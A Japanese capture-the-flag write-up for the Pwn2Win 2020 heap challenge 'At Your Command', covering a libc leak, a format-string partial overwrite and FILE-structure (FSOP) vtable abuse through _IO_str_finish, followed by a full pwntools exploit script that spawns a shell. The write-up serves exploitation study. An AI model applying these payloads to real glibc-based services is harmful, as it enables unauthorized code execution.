---
tags: pwn
---

# Pwn2Win CTF 2020 - At Your Command

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

コマンドの情報を入力するHeap問題、書き込んだ情報がファイルに書き込まれる
delete時にポインタが消されてしまうのでUAF, Double Freeは無いが、Unsorted Binに放り込んだ後にbkの一部(というか最下位バイト以外)を読めてしまうのでlibc leakは簡単に出来る、mallocサイズが0x188で固定なのでtcacheを埋めてからfreeしてUnsorted Binに入れてからleakすればよい
`sprintf`を使っている部分でFSBがあるのでここでファイル構造体へのポインタを書き換える、これはHeap領域上にあるのでHeap領域上に偽装したファイル構造体を作っておけばFSAでPartial Overwriteすることでそちらへ向けることが出来る(但し4bit分のガチャが必要)
最後にfcloseが呼ばれるので偽装した構造体のvtableを`_IO_str_jumps`に向けて`_IO_file_finish`の代わりに`_IO_str_finish`を呼ぶ。`_IO_str_finish`は`_IO_strfile_->_s._free_buffer`を呼ぶのでここにシェル起動アドレスを放り込めばシェルが起動する

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

* libc: 2.27
* 保持可能ポインタ: 10
* malloc可能サイズ: 0x188(固定)
* コマンド
    1. include: priorityとcommandの2つを入力する、ヌル文字を終端に付与しない
    2. review: 特に変哲の無いshow
    3. delete: free、ポインタは破棄される
    4. list: これまで作ったコマンドを全部showする
    5. send: これまで作ったコマンドをファイルに書き込む
* その他:
    * 最初に名前(12文字まで)を入力出来るが、これは5. のコマンドの後で`sprintf(buf, 0xc, name)`のように書き込まれる。つまりFSBが存在する

### libc leak

この問題で1番簡単な部分、8つのチャンクを用意して片っ端からfreeし、8回目のfreeでUnsorted Binに入る(topとの結合は防ぐ)
続いて7回mallocすればtcacheが空になるので次のmallocでUnsorted Binから取られる
この時、fdだった部分にはpriorityが入り、bkにはcommandが入るが、後者は1バイトだけ書き込めばいいので情報が残る。これをreviewで見ることでlibc leak出来る

### Format String Attack

最初に入力する名前を`name`として`sprintf(buf, 0xc, name)`という処理が行われる部分がある。これを利用してファイルディスクリプタのポインタが入っているアドレスを指定して書き換えれば、次の`fclose`で別のポインタを引数にとることが出来る。
ここで直前のHeap領域を覗いてみる
(そういえばWSLってなんでHeapのアドレスが0x55\~, 0x56\~じゃなくて0x7f\~になるんだ...?0x55, 0x56をサイズヘッダとみなすfastbin attackが試せなくて困る)

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x7fffe198a000      0x0                 0x250                Used                None              None
0x7fffe198a250      0x0                 0x190                Used                None              None
0x7fffe198a3e0      0x190               0x190                Used                None              None
0x7fffe198a570      0x0                 0x190                Used                None              None
0x7fffe198a700      0x0                 0x190                Used                None              None
0x7fffe198a890      0x0                 0x190                Used                None              None
0x7fffe198aa20      0x0                 0x190                Used                None              None
0x7fffe198abb0      0x0                 0x190                Used                None              None
0x7fffe198ad40      0x0                 0x190                Used                None              None
0x7fffe198aed0      0x0                 0x190                Used                None              None
0x7fffe198b060      0x0                 0x230                Used                None              None
0x7fffe198b290      0x7fbedbfe7d60      0x210                Used                None              None
gdb-peda$ 
```

0x7fffe198b070に本来のファイルディスクリプタがある、ここを指すポインタ0x7fffe198aee0に変えてしまい、事前に0x7fffe198aee0に偽装したファイル構造体を入れておけば`fclose(fp)`で起こる動作をある程度制御できそうである
というわけでペイロードは`"%{0}c%4$hn".format(0xcee0)`のようになった(0xaee0に書き換えたいのに0xcee0と値が違うのはランダム化のせいでペイロードを設定した時とはアドレスが違うからです)にようになった。`%4$n`の部分はデバッガを覗きながら探した(のとWriteupを見た)
ちなみに、ASLRのせいでHeap領域のアドレスは下位12bitしか確定しない、よって下位2バイトを書き換えるなら4bit分の運試しが発生する(最初は20回ぐらい外しました)

(そういえばこの企画でFSA扱うのこれが初めてでは?あんまり経験が無いのもありますが、実はそこまでFSA問題得意じゃないです)

### FSOP

長くなりそうなので適当に分割する

#### fclose時に起こること

fcloseの定義は次のようになっている(一部抜粋)

```c
int
_IO_new_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  
  ...
}
```
(<https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/iofclose.c#L33>より)

上から見ていく
`CHECK_FILE`はおそらくだが何もしない、`IO_DEBUG`が定義されているなら色々動作があるらしいがそうでないなら何もしない
次も関係なさそうなので無視する
続いて2つif文が並んでいるが、これは`fp->_IO_file_flags`を適切に設定すれば無視できそうである
`_IO_acquire_lock`, `_IO_release_lock`のマクロ定義は次の通り

```c
#if !defined _IO_MTSAFE_IO && IS_IN (libc)
# define _IO_acquire_lock(_fp)						      \
  do {									      \
    _IO_FILE *_IO_acquire_lock_file = NULL
# define _IO_acquire_lock_clear_flags2(_fp)				      \
  do {									      \
    _IO_FILE *_IO_acquire_lock_file = (_fp)
# define _IO_release_lock(_fp)						      \
    if (_IO_acquire_lock_file != NULL)					      \
      _IO_acquire_lock_file->_flags2 &= ~(_IO_FLAGS2_FORTIFY		      \
                                          | _IO_FLAGS2_SCANF_STD);	      \
  } while (0)
#endif
```
(<https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/libioP.h#L810>より)

今回は`_IO_acquire_lock_clear_flags2`が呼ばれていないので多分何もせず終わる
こうして無事に`_IO_FINISH (fp)`に辿り着き、これは`fp->vtable`の内、終了時に発火する関数を呼び出す。`_IO_file_plus`なら`_IO_file_jumps`から`_IO_file_finish`が呼ばれるし、`_IO_strfile_`なら今回利用する`_IO_str_finish`が呼ばれる

#### vtable改竄

今回`fclose(fp)`の引数となる`fp`は偽装した構造体を指すポインタであるが、ここのvtableを書き換えれば任意アドレスに飛ばせそうな気がする
これは半分正解でvtableとして問題が無いvtableが指定されているなら(具体的にはlibc中のある領域にあるvtable、詳細は参考文献2, 3)書き換えても問題無い。しかし、Heap上に作ったvtableを利用しようとすると落ちる。
ここで`_IO_FILE_plus`が使うvtableは`_IO_file_jumps`だが、これ以外にもvtableはいくつかある。次で説明するが`_IO_strfile_`が使う`_IO_str_jumps`を使えば良い感じに呼ぶ関数と引数を設定できそうである

#### `_IO_strfile_`のvtable

ということで`_IO_strfile_`のvtableである`_IO_str_jumps`を覗いてみる。

```c
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

(<https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/strops.c#L355>より)

ここで`_IO_str_finish`を見てみる

```c
void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

(<https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/strops.c#L346>より)

最初のif文さえ突破すれば`(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);`によって良い感じに関数が呼べそうである。
よって`fp->_s._free_buffer`がsystem関数, `fp->_IO_buf_base`が`"/bin/sh"`のあるアドレスを指すように偽装した構造体をHeap上に用意してこれをfcloseさせる。
コード中では他のメンバも適当に弄っているが、本来使われていた方の`_IO_FILE_plus`構造体をパクった部分が大きい(実際に偽装しているのは`_IO_strfile_`構造体であるが、vtableまではだいたい同じなのでパクった)
また、参考文献2によれば`_lock`メンバはnullを指すポインタを置けば特に問題は起こらないらしい

`_IO_strfile_`については参考文献5(glibcのソースコード)を参考にペイロードを構成した

ちなみにincludeコマンドでは最初にpriorityの入力を要求されるがここで`fp->_flags`を入力しておけば良い、fclose中のif文を回避出来れば良いので0xfbad1800を使った

### 祈る

1/16です

## Code

```python
from pwn import p64, u64, ELF, process
from xlog import XLog


def select(s, sel, c="> "):
    s.recvuntil(c)
    s.sendline(str(sel))


def include(s, priority, command):
    select(s, 1)
    s.recvuntil("Priority: ")
    s.sendline(str(priority))
    s.recvuntil("Command: ")
    s.send(command)


def review(s, idx):
    select(s, 2)
    s.recvuntil("Command index: ")
    s.sendline(str(idx))
    s.recvuntil("Priority: ")
    priority = int(s.recvline().rstrip())
    s.recvuntil("Command: ")
    command = s.recvline().rstrip()

    return priority, command


def delete(s, idx):
    select(s, 3)
    s.recvuntil("Command index: ")
    s.sendline(str(idx))


# def list(s):


def send(s):
    select(s, 5)
    s.recvuntil("which rbs?\n")
    s.sendline(str(114514))


if __name__ == '__main__':
    """
        - 作成可能なコマンドは10個まで
        - 固定サイズmalloc(0x188)
    """
    logger = XLog("EXPLOIT")

    libc = ELF("./libc.so.6")
    binsh_libc = next(libc.search(b"/bin/sh\x00"))
    stderr_libc = libc.symbols["_IO_2_1_stderr_"]
    system_libc = libc.symbols["system"]
    str_vtable_libc = 0x7f113e9e8360 - 0x7f113e600000
    s = process("./_cmd", env={"DEBUG": b"1"})

    # name = "unkoman"
    name = "%{0}c%4$hn".format(0xcee0)
    s.recvuntil("Your name: ")
    s.send(name)

    for _ in range(8):
        include(s, 1, "unko")

    for i in range(8, -1, -1):
        delete(s, i)

    for _ in range(8):
        include(s, 1, "a")
    
    libc_addr = u64(review(s, 7)[1].ljust(8, b"\x00")) - 0x3ebc61
    logger.libc(libc_addr)

    payload = p64(0) * 6
    payload += p64(libc_addr + binsh_libc)
    payload += p64(0) * 5
    payload += p64(libc_addr + stderr_libc)  # _chain
    payload += p64(3)
    payload += p64(0) * 2
    null_adr = libc_addr + libc.symbols["__free_hook"]  # _lock
    payload += p64(null_adr)
    payload += p64(0xffffffffffffffff)
    payload += p64(0)
    payload += p64(null_adr + 0x10)  # ???
    payload += p64(0) * 6
    payload += p64(libc_addr + str_vtable_libc)
    payload += p64(0)
    payload += p64(libc_addr + system_libc)  # _s._free_buffer

    include(s, 0xfbad1800, payload)

    send(s)

    s.interactive()

```

## Flag

ローカルシェル取り太郎先輩

## 感想

大変だった、事前に4人ぐらいのWriteupとFSOPに関する資料(複数)とglibcの該当するソースコードを付き合わせながら読んだ上で今日は手元のExploitが通るかの検証もしていたのでFSOP自体の習得にかけた時間はこれまで学んだ手法の中でも特に長い気がする

なお、せっかくここまで苦労して習得したFSOPも2.28(?)以降は`_s.allocate_buffer`や`_s._free_buffer`が使われず、malloc, freeに置き換わってしまうらしい

## 参考文献

1. [Play with FILE Structure - Yet Another Binary Exploit Technique](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)
2. [FILE Structure Exploitation ('vtable' check bypass)](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/)
3. [\_IO\_str\_overflowを使ったvtable改竄検知の回避手法](https://ptr-yudai.hatenablog.com/entry/2019/02/12/000202)
4. [Pwn2Win CTF 2020: At Your Command write-up](https://ypl.coffee/pwn2win-2020-at-your-command/): `_IO_str_finish`で解いていた貴重な記事
5. [strfile.h - libio/strfile.h](https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/strfile.h#L32)